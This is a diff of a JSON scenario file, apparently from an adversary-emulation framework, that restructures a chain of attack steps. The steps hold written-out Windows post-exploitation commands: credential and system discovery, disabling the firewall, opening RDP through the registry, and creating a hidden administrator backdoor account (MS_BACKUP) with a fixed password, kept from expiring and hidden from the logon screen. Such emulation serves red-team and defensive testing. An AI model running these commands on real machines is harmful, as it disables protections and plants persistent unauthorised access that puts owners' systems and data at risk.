@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,7 +70,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -76,7 +82,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -86,10 +93,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -102,7 +109,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_low",
                 "target_2": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -112,10 +120,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -125,10 +133,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "systeminfo"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "systeminfo"
             }
         },
         {
@@ -138,10 +146,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmdkey /list"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmdkey /list"
             }
         },
         {
@@ -151,10 +159,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "tasklist /v"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "tasklist /v"
             }
         },
         {
@@ -164,10 +172,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -nao"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -nao"
             }
         },
         {
@@ -177,10 +185,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -rn"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -rn"
             }
         },
         {
@@ -190,10 +198,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -203,10 +211,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "arp -a"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "arp -a"
             }
         },
         {
@@ -216,10 +224,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net share"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net share"
             }
         },
         {
@@ -229,10 +237,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net use"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net use"
             }
         },
         {
@@ -242,10 +250,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user %username%"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user %username%"
             }
         },
         {
@@ -255,10 +263,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user %username% /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user %username% /domain"
             }
         },
         {
@@ -268,10 +276,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c set"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c set"
             }
         },
         {
@@ -281,10 +289,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c dir %systemdrive%\\Users\\*.*"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c dir %systemdrive%\\Users\\*.*"
             }
         },
         {
@@ -294,10 +302,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c dir %appdata%\\Microsoft\\Windows\\Recent\\*.*"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c dir %appdata%\\Microsoft\\Windows\\Recent\\*.*"
             }
         },
         {
@@ -307,10 +315,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c dir %userprofile%\\Desktop\\*.*"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c dir %userprofile%\\Desktop\\*.*"
             }
         },
         {
@@ -320,10 +328,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{ls ${$env:ProgramFiles(x86)}}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{ls ${$env:ProgramFiles(x86)}}"
             }
         },
         {
@@ -333,10 +341,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{ls ${$env:ProgramFiles}}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{ls ${$env:ProgramFiles}}"
             }
         },
         {
@@ -346,10 +354,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c dir %appdata%"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c dir %appdata%"
             }
         },
         {
@@ -359,10 +367,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "whoami /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "whoami /all"
             }
         },
         {
@@ -372,10 +380,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netsh firewall set opmode disable"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netsh firewall set opmode disable"
             }
         },
         {
@@ -385,10 +393,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netsh advfirewall set allprofiles state off"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netsh advfirewall set allprofiles state off"
             }
         },
         {
@@ -398,10 +406,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"\"\"3389:TCP:*:Enabled:Remote Desktop\"\"\" -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"\"\"3389:TCP:*:Enabled:Remote Desktop\"\"\" -force}"
             }
         },
         {
@@ -411,10 +419,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"3389:TCP:*:Enabled:Remote Desktop\" -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"3389:TCP:*:Enabled:Remote Desktop\" -force}"
             }
         },
         {
@@ -424,10 +432,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fDenyTSConnections -PropertyType DWORD -value 0 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fDenyTSConnections -PropertyType DWORD -value 0 -force}"
             }
         },
         {
@@ -437,10 +445,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fSingleSessionPerUser -PropertyType DWORD -value 0 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fSingleSessionPerUser -PropertyType DWORD -value 0 -force}"
             }
         },
         {
@@ -450,10 +458,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
             }
         },
         {
@@ -463,10 +471,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
             }
         },
         {
@@ -476,10 +484,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name AllowMultipleTSSessions -PropertyType DWORD -value 1 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name AllowMultipleTSSessions -PropertyType DWORD -value 1 -force}"
             }
         },
         {
@@ -489,10 +497,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MaxInstanceCount -PropertyType DWORD -value 100 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MaxInstanceCount -PropertyType DWORD -value 100 -force}"
             }
         },
         {
@@ -502,10 +510,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user MS_BACKUP P@55w0Rd1337 /add /Y"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user MS_BACKUP P@55w0Rd1337 /add /Y"
             }
         },
         {
@@ -515,10 +523,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup Administrators /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup Administrators /add MS_BACKUP"
             }
         },
         {
@@ -528,10 +536,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup Administradores /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup Administradores /add MS_BACKUP"
             }
         },
         {
@@ -541,10 +549,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup Amministratori /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup Amministratori /add MS_BACKUP"
             }
         },
         {
@@ -554,10 +562,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup Administratoren /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup Administratoren /add MS_BACKUP"
             }
         },
         {
@@ -567,10 +575,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup Administrateurs /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup Administrateurs /add MS_BACKUP"
             }
         },
         {
@@ -580,10 +588,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup \"Remote Desktop Users\" /add MS_BACKUP"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup \"Remote Desktop Users\" /add MS_BACKUP"
             }
         },
         {
@@ -593,10 +601,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user MS_BACKUP /expires:never"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user MS_BACKUP /expires:never"
             }
         },
         {
@@ -606,10 +614,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MS_BACKUP -PropertyType DWORD -value 0 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MS_BACKUP -PropertyType DWORD -value 0 -force}"
             }
         },
         {
@@ -619,10 +627,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name dontdisplaylastusername -PropertyType DWORD -value 1 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name dontdisplaylastusername -PropertyType DWORD -value 1 -force}"
             }
         },
         {
@@ -632,10 +640,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name LocalAccountTokenFilterPolicy -PropertyType DWORD -value 1 -force}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name LocalAccountTokenFilterPolicy -PropertyType DWORD -value 1 -force}"
             }
         },
         {
@@ -645,10 +653,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "sc config termservice start= auto"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "sc config termservice start= auto"
             }
         },
         {
@@ -658,10 +666,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net start termservice"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net start termservice"
             }
         },
         {
@@ -672,7 +680,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -682,7 +691,8 @@
                 "agent": "self.agent_tgt1_low",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
